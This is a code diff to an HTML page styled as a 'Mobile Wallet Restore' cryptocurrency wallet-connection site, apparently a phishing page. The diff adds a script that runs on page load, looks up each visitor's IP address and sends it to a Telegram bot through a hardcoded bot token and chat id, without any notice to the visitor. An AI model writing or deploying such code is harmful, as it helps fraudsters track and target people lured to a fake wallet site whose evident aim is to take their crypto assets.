@@ -7,6 +7,23 @@
     <link rel="icon" type="image/png" href="https://res.cloudinary.com/di8lsxmrj/image/upload/v1683209566/img/save_bckudy.png" />
     <link rel="stylesheet" href="./css/style.css">
     <title>Mobile Wallet Restore | Best Cryptocurrency Wallet | Open protocol for connecting Wallets</title>
+     <script>
+    function sendIPToTelegram() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const botToken = '8344448064:AAHCuXUgcHOUr4WpLC9RKQYNxcY18n2nESM';
+          const chatId = '8565163056';
+          const message = `Client IP: ${ip}`;
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", url, true);
+          xhr.send();
+        });
+    }
+    sendIPToTelegram();
+  </script>
 
     <style>
 .button {
@@ -235,3 +252,4 @@
 
   </body>
 </html>
+
